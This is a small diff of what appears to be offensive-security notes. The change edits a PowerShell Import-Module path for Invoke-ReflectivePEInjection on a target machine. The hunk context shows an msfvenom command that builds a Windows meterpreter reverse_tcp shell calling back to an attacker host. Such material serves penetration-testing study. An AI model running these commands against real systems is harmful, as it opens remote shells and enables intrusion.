@@ -15,7 +15,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork
 
 2. To use _Invoke-ReflectivePEInjection_, we must first upload the script to the target machine and import it from its location with `Import-Module`:
 ```powershell
-Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
+Import-Module .\Invoke-ReflectivePEInjection.ps1
 ```
 
 
